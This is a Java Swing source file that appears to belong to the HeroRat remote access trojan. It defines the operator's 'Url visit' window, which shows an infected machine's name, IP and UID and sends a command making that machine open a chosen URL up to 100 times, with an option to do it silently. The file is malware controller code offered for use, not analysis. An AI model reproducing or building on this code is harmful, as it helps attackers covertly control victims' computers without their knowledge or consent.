package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;

import net.herorat.features.servers.Server;
import net.herorat.features.urlvisit.UrlVisit;


public class FrameUrlVisit extends JFrame
{
	private static final long serialVersionUID = -1234562012125229429L;
	
	private Server server;
	
	private JLabel label_url;
	private JTextField field_url;
	private JLabel label_times;
	private JSpinner spinner_times;
	private JCheckBox box_silent;
	private JButton button_go;

	public FrameUrlVisit(Server server)
	{
		this.server = server;
		
		initComponents();
		display();
		centerWindow();
	}
	
	private void initComponents()
	{
		setTitle("Internet - " + server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
		setPreferredSize(new Dimension(350, 160));
		setMinimumSize(new Dimension(350, 160));
		setResizable(false);
		setLayout(new BorderLayout(5, 0));
		
		createPanel();
	}
	
	private void display()
	{
		setVisible(true);
		pack();
	}
	
	private void centerWindow()
	{
		int bounds_top = Toolkit.getDefaultToolkit().getScreenSize().height / 2;
		int bounds_left = Toolkit.getDefaultToolkit().getScreenSize().width / 2;
		int half_height = this.getSize().height / 2;
		int half_width = this.getSize().width / 2;
		this.setLocation(bounds_left - half_width, bounds_top - half_height);
	}
	
	private void createPanel()
	{
		JPanel panel = new JPanel();
		
		panel.setPreferredSize(new Dimension(340, 140));
		panel.setMinimumSize(new Dimension(340, 140));;
		
		label_url = new JLabel("Url: ");
		label_url.setPreferredSize(new Dimension(100, 20));
		field_url = new JTextField("http://");
		field_url.setPreferredSize(new Dimension(200, 20));
		
		label_times = new JLabel("Times: ");
		label_times.setPreferredSize(new Dimension(100, 20));
		spinner_times = new JSpinner();
		spinner_times.setModel(new SpinnerNumberModel(1, 1, 100, 1));
		spinner_times.setPreferredSize(new Dimension(200, 20));
		
		JLabel label_blank = new JLabel();
		label_blank.setPreferredSize(new Dimension(100, 20));
		box_silent = new JCheckBox("Visit the url silently");
		box_silent.setPreferredSize(new Dimension(200, 20));
		
		button_go = new JButton("Go");
		button_go.setPreferredSize(new Dimension(300, 25));
		
		button_go.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (field_url.getText().startsWith("http://"))
				{
					UrlVisit.send(server, field_url.getText(), Integer.parseInt(spinner_times.getValue().toString()), box_silent.isSelected());
					FrameUrlVisit.this.dispose();
				}
			}
		});
		
		panel.add(label_url);
		panel.add(field_url);
		panel.add(label_times);
		panel.add(spinner_times);
		panel.add(label_blank);
		panel.add(box_silent);
		panel.add(button_go);
		
		JPanel main_panel = new JPanel();
		main_panel.add(panel);
		add(main_panel, BorderLayout.CENTER);
	}
}
